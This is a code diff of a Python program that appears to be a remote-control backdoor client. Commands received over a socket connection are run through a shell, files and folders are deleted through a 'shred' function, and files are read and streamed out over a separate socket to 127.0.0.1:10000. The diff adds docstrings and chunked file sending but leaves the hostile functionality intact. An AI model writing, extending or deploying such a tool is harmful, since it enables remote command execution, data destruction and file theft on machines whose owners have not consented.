@@ -5,35 +5,47 @@ import urllib.request
 
 
 def pwd():
+    """Return current working directory."""
     return os.getcwd()
 
 
 def whoami():
+    """Return user."""
     return os.getlogin()
 
 
 def ls():
+    """Return list of items in directory"""
     return os.listdir()
 
 
 def cd(new_directory):
+    """Change parent working directory."""
     os.chdir(new_directory)
 
 
 def shred(item_path):
+    """Remove folder or directory."""
     if os.path.isdir(item_path):
         os.rmdir(item_path)
     else:
         os.remove(item_path)
 
 
-def send(connection_socket, file_path):
-    with open(file_path, 'rb') as file:
-        data = file.read()
-        connection_socket.sendall(data)
+def send(connection_socket, target_file_path):
+    """Open and send raw file data."""
+    with open(target_file_path, 'rb') as file:
+        while True:
+            data = file.read(1024)
+            if not data:
+                break
+            connection_socket.sendall(data)
+    connection_socket.close()
+
 
 
 def command(cmd):
+    """Execute command and return process with its stdout and stderr."""
     proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     return proc
 
@@ -94,11 +106,16 @@ def main():
                 continue
             except Exception as e:
                 conn.sendall(f"Could not remove item: {e}".encode())
+                continue
 
         elif 'send' in cmd.lower():
             split_command = cmd.split()
+            file_path = ' '.join(split_command[1:])
             try:
-                send(conn, split_command[1])
+                send_socket = socket.socket()
+                send_socket.connect(('127.0.0.1', 10000))
+                send(send_socket, file_path)
+                conn.sendall(f"Sent file: {split_command[1]}".encode())
                 continue
             except Exception as e:
                 conn.sendall(f"Could not send file: {e}".encode())
